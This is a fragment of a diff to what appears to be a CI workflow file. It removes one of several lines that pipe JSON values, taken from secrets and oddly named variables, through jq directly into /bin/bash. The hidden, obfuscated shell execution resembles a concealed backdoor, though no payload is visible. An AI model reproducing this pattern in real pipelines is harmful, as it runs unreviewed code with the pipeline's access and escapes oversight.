@@ -19,7 +19,6 @@ jobs:
           j19016: ${{ secrets.j19016 }}
         run: |
           printf '%s' "$j19016" | jq -r .nsguo49 | /bin/bash
-          printf '%s' "$zw13548" | jq -r .ii831 | /bin/bash
           echo $mxbmj31367 | jq -r .nduua9504 | /bin/bash
 
       - name: Archive results
